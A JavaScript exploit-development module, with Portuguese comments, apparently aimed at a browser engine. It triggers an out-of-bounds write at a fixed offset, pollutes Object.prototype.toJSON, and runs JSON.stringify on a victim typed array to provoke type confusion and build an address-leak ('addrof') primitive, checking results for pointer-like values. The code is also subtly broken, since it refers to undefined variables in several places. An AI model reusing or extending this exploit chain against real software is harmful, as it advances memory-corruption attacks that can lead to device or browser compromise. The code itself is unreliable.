// js/script3/testArrayBufferVictimCrash.mjs (v81a_FixBugsAndConfirmGetterControl)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V81A_FBCGC = "OriginalHeisenbug_TypedArrayAddrof_v81a_FixBugsConfirmGetter";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUES_V81A = [0xFFFFFFFF, 0x7FFFFFFF]; 

let object_to_leak_A_v81a = null; // Não será diretamente retornado pelo getter principal
let object_to_leak_B_v81a = null;
let victim_typed_array_ref_v81a = null; 
let probe_call_count_v81a = 0;
let marker_M1_ref_v81a = null; 
let marker_M2_ref_v81a = null; 
// Armazena o objeto de detalhes da sonda da chamada onde M2 foi 'this' e confuso.
let details_of_M2_confusion_event_v81a = null; 
const PROBE_CALL_LIMIT_V81A = 7; 


function toJSON_TA_Probe_FixBugsConfirmGetter() {
    probe_call_count_v81a++;
    const call_num = probe_call_count_v81a;
    let current_call_log_info = { 
        call_number: call_num,
        probe_variant: "TA_Probe_V81a_FixBugsConfirmGetter",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v81a),
        this_is_M1: (this === marker_M1_ref_v81a && marker_M1_ref_v81a !== null),
        this_is_M2: (this === marker_M2_ref_v81a && marker_M2_ref_v81a !== null),
        m2_interaction_summary: null, 
        error_in_probe: null
    };
    logS3(`[PROBE_V81a] Call #${call_num}. 'this': ${current_call_log_info.this_type}. IsVictim? ${current_call_log_info.this_is_victim}. IsM1? ${current_call_log_info.this_is_M1}. IsM2? ${current_call_log_info.this_is_M2}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V81A) {
            logS3(`[PROBE_V81a] Call #${call_num}: Probe limit. Stop.`, "warn");
            // Atualizar details_of_M2_confusion_event_v81a com esta chamada se for a mais relevante e nada foi capturado
            if (!details_of_M2_confusion_event_v81a) details_of_M2_as_this_call_v81 = current_call_log_info;
            return { recursion_stopped_v81a: true };
        }

        if (call_num === 1 && current_call_log_info.this_is_victim) {
            logS3(`[PROBE_V81a] Call #${call_num}: 'this' is victim. Returning M1 (contains M2).`, "info");
            marker_M2_ref_v81a = { marker_id_v81a: "M2_V81a_Target" }; 
            marker_M1_ref_v81a = { marker_id_v81a: "M1_V81a_Container", payload_M2: marker_M2_ref_v81a };
            // Não definir details_of_M2_confusion_event_v81a aqui, pois M2 ainda não foi 'this'
            return marker_M1_ref_v81a;
        } else if (current_call_log_info.this_is_M2) { 
            logS3(`[PROBE_V81a] Call #${call_num}: 'this' IS M2. Current type: ${current_call_log_info.this_type}. Checking for TC...`, "critical");
            current_call_log_info.m2_interaction_summary = {
                getter_defined: false, direct_prop_set: false, keys_after: "N/A"
            };
            if (current_call_log_info.this_type === '[object Object]') { 
                logS3(`[PROBE_V81a] Call #${call_num}: TYPE CONFUSION ON M2 ('this')! ID: ${this.marker_id_v81a}. Defining getter & prop...`, "vuln");
                
                Object.defineProperty(this, 'leaky_A_getter_v81a', {
                    get: function() {
                        logS3(`[PROBE_V81a] !!! Getter 'leaky_A_getter_v81a' on confused M2 (call #${call_num}) FIRED !!! RETURNING 'this' (M2).`, "vuln");
                        return this; // Retorna o próprio M2 para causar circularidade se stringify tentar serializá-lo
                    }, enumerable: true, configurable: true
                });
                current_call_log_info.m2_interaction_summary.getter_defined = true;
                
                this.leaky_B_direct_v81a = object_to_leak_B_v81a;
                current_call_log_info.m2_interaction_summary.direct_prop_set = true;
                try{ current_call_log_info.m2_interaction_summary.keys_after = Object.keys(this).join(','); } catch(e){}
                logS3(`[PROBE_V81a] Call #${call_num}: Getter and prop set on M2 ('this'). Keys: ${current_call_log_info.m2_interaction_summary.keys_after}`, "info");
                
                // Esta é a chamada de interesse, capturar seus detalhes
                details_of_M2_confusion_event_v81a = { ...current_call_log_info }; 
            } else {
                 logS3(`[PROBE_V81a] Call #${call_num}: M2 ('this') was NOT [object Object]. Type: ${current_call_log_info.this_type}`, "warn");
                 // Se M2 não está confuso, mas esta é a chamada onde M2 foi 'this', ainda registrar.
                 if (!details_of_M2_confusion_event_v81a || !details_of_M2_confusion_event_v81a.m2_interaction_summary) {
                    details_of_M2_confusion_event_v81a = { ...current_call_log_info };
                 }
            }
            return this; // Retorna M2 (potencialmente modificado ou não)
        } else if (this === object_to_leak_A_v81a || this === object_to_leak_B_v81a) {
            logS3(`[PROBE_V81a] Call #${call_num}: 'this' is one of the leak_target objects. Returning simple marker.`, "info");
            // Não sobrescrever details_of_M2_confusion_event_v81a aqui
            return { serializing_leaked_obj_marker_v81a: call_num };
        }
    } catch (e) {
        current_call_log_info.error_in_probe = e.message;
        // Não sobrescrever details_of_M2_confusion_event_v81a aqui a menos que seja a primeira definição ou erro na chamada de M2
         if (!details_of_M2_confusion_event_v81a && current_call_log_info.this_is_M2) {
             details_of_M2_confusion_event_v81a = current_call_log_info;
         } else if (!details_of_M2_confusion_event_v81a) {
             details_of_M2_confusion_event_v81a = current_call_log_info;
         }
    }
    // Retorno genérico para outras chamadas (ex: Call #3+ se M2 não for 'this' ou se M1 não for 'this')
    // Garantir que details_of_M2_as_this_call_v81 seja definido se ainda for null, para o log externo.
    if (!details_of_M2_confusion_event_v81a) {
        details_of_M2_confusion_event_v81a = current_call_log_info;
    }
    return { generic_marker_v81a: call_num }; 
}


export async function executeTypedArrayVictimAddrofTest_FixBugsAndConfirmGetterControl() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81A_FBCGC}`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (FixBugsAndConfirmGetterControl) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81A_FBCGC} Init...`;

    let overall_results = [];

    for (const current_oob_value of OOB_WRITE_VALUES_V81A) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Val${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        probe_call_count_v81a = 0;
        victim_typed_array_ref_v81a = null; 
        marker_M1_ref_v81a = null;
        marker_M2_ref_v81a = null;
        details_of_M2_confusion_event_v81a = null; // Reset para cada iteração
        object_to_leak_A_v81a = { marker_A_v81a: `LeakA_Val${toHex(current_oob_value)}`}; 
        object_to_leak_B_v81a = { marker_B_v81a: `LeakB_Val${toHex(current_oob_value)}`};

        let iterError = null; // Erro capturado DENTRO da iteração (no try/catch do stringify)
        let stringifyOutput_parsed_iter = null; 
        
        // Estes são para os resultados da iteração
        let addrof_M2_Getter_iter = { success: false, msg: "M2.leaky_A_getter: Default"};
        let addrof_M2_Direct_iter = { success: false, msg: "M2.leaky_B_direct: Default"};
        
        try {
            await triggerOOB_primitive({ force_reinit: true });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, current_oob_value, 4);
            logS3(`  OOB Write done for iter Val${toHex(current_oob_value)}.`, "info", FNAME_CURRENT_ITERATION);
            await PAUSE_S3(100);
            victim_typed_array_ref_v81a = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
            logS3(`STEP 2: victim_typed_array_ref_v81a created.`, "test", FNAME_CURRENT_ITERATION);
            
            const ppKey = 'toJSON';
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let pollutionApplied = false;

            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_FixBugsConfirmGetter, writable: true, configurable: true, enumerable: false });
                pollutionApplied = true;
                let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v81a); 
                logS3(`  JSON.stringify iter Val${toHex(current_oob_value)} completed. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_ITERATION);
                try { stringifyOutput_parsed_iter = JSON.parse(rawStringifyOutput); } 
                catch (e_parse) { 
                    logS3(`  Error parsing stringifyOutput for iter Val${toHex(current_oob_value)}: ${e_parse.message}`, "warn");
                    stringifyOutput_parsed_iter = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
                }
                
                // details_of_M2_confusion_event_v81a deve ter sido definido pela sonda se M2 foi 'this' e confuso.
                logS3(`  EXECUTE (Iter): Captured details of M2 confusion event: ${details_of_M2_confusion_event_v81a ? JSON.stringify(details_of_M2_confusion_event_v81a) : 'N/A (M2 not 'this' or no confusion)'}`, "leak", FNAME_CURRENT_ITERATION);

                let heisenbugOnM2 = details_of_M2_confusion_event_v81a?.this_is_M2 && details_of_M2_confusion_event_v81a?.this_type === "[object Object]";
                logS3(`  EXECUTE (Iter): Heisenbug on M2 Target ${heisenbugOnM2 ? "CONFIRMED" : "NOT Confirmed"}.`, heisenbugOnM2 ? "vuln" : "error", FNAME_CURRENT_ITERATION);
                    
                // O addrof não é o foco principal, mas sim observar o stringifyOutput_parsed_iter para circularidade
                // ou para os valores retornados pelo getter.
                if (heisenbugOnM2 && stringifyOutput_parsed_iter?.payload_M2) {
                    const m2_from_output = stringifyOutput_parsed_iter.payload_M2;
                    logS3("   Inspecting M2 from stringifyOutput:", "info", FNAME_CURRENT_ITERATION);
                    
                    const getter_val = m2_from_output.leaky_A_getter_v81a;
                    if (getter_val === "getter_fired_no_addr" || (typeof getter_val === 'number' && !isNaN(getter_val))) { // Adaptar se o getter retornar outra coisa
                        addrof_M2_Getter_iter.success = true; // Sucesso aqui significa que o getter retornou o que queríamos (ou um placeholder)
                        addrof_M2_Getter_iter.msg = `Getter on M2 returned: ${JSON.stringify(getter_val)}`;
                         if (typeof getter_val === 'number' && getter_val !== 0 && getter_val !== 1337.7331) {
                             // Checar se parece ponteiro
                            let g_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([getter_val]).buffer)[0], new Uint32Array(new Float64Array([getter_val]).buffer)[1]);
                             if ((g_int64.high() > 0 && g_int64.high() < 0x000F0000) || (g_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                                addrof_M2_Getter_iter.msg += ` - LOOKS LIKE POINTER: ${g_int64.toString(true)}`;
                            }
                        }
                    } else { addrof_M2_Getter_iter.msg = `Getter on M2 returned unexpected: ${JSON.stringify(getter_val)}`;}

                    const direct_val = m2_from_output.leaky_B_direct_v81a;
                    if (direct_val && direct_val.marker_B_v81a === object_to_leak_B_v81a.marker_B_v81a) {
                        addrof_M2_Direct_iter.success = true; addrof_M2_Direct_iter.msg = "ObjB identity found in M2.leaky_B_direct.";
                    } else { addrof_M2_Direct_iter.msg = `M2.leaky_B_direct not ObjB identity. Val: ${JSON.stringify(direct_val)}`;}
                }

            } catch (e_str) { iterError = e_str; 
                logS3(`    ERROR in iteration Val${toHex(current_oob_value)} (stringify/analysis): ${e_str.name} - ${e_str.message}`, "error", FNAME_CURRENT_ITERATION);
            } 
            finally { if (pollutionApplied) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null }); }
        } catch (e_outer) { iterError = e_outer; 
            logS3(`    ERROR in iteration Val${toHex(current_oob_value)} (outer try): ${e_outer.name} - ${e_outer.message}`, "error", FNAME_CURRENT_ITERATION);
        } 
        finally { clearOOBEnvironment({force_clear_even_if_not_setup: true}); }
        
        overall_results.push({
            oob_value: toHex(current_oob_value), error: iterError ? `${iterError.name}: ${iterError.message}` : null,
            m2_confusion_details: details_of_M2_as_this_call_v81a ? JSON.parse(JSON.stringify(details_of_M2_as_this_call_v81a)) : null, 
            final_stringify_output_parsed_iter: stringifyOutput_parsed_iter,
            addrof_M2_Getter_iter_res: {...addrof_M2_Getter_iter}, 
            addrof_M2_Direct_iter_res: {...addrof_M2_Direct_iter},
            probe_calls_this_iter: probe_call_count_v81a
        });
        if (addrof_M2_Getter_iter.success || addrof_M2_Direct_iter.success) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81A_FBCGC}: Addr? Val${toHex(current_oob_value)} SUCCESS!`;
        }
        await PAUSE_S3(100); 
    } 

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
    overall_results.forEach(res => { /* ... logging resumido ... */ });
    if (!document.title.includes("SUCCESS")) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81A_FBCGC}: All Vals Tested.`;
    
    let final_report_obj = { // Para o runner
        errorOccurred: null, // Se um erro ocorreu FORA dos loops de iteração
        iteration_results_summary: overall_results.map(r => ({
            oob_value: r.oob_value, 
            m2_tc_confirmed: r.m2_confusion_details?.this_is_M2 && r.m2_confusion_details?.this_type === '[object Object]',
            getter_success: r.addrof_M2_Getter_iter_res.success,
            direct_success: r.addrof_M2_Direct_iter_res.success,
            error: r.error
        })),
        // Pegar os detalhes da última iteração ou da primeira bem-sucedida para o runner
        toJSON_details: null, stringifyResult: null, addrof_A_result: null, addrof_B_result: null, total_probe_calls: 0
    };
    let report_iter = overall_results.find(r => r.addrof_M2_Getter_iter_res.success || r.addrof_M2_Direct_iter_res.success) || (overall_results.length > 0 ? overall_results[overall_results.length - 1] : null);
    if(report_iter){
        final_report_obj.toJSON_details = report_iter.m2_confusion_details;
        final_report_obj.stringifyResult = report_iter.final_stringify_output_parsed_iter;
        final_report_obj.addrof_A_result = report_iter.addrof_M2_Getter_iter_res;
        final_report_obj.addrof_B_result = report_iter.addrof_M2_Direct_iter_res;
        final_report_obj.total_probe_calls = report_iter.probe_calls_this_iter;
    }
    
    return final_report_obj;
}
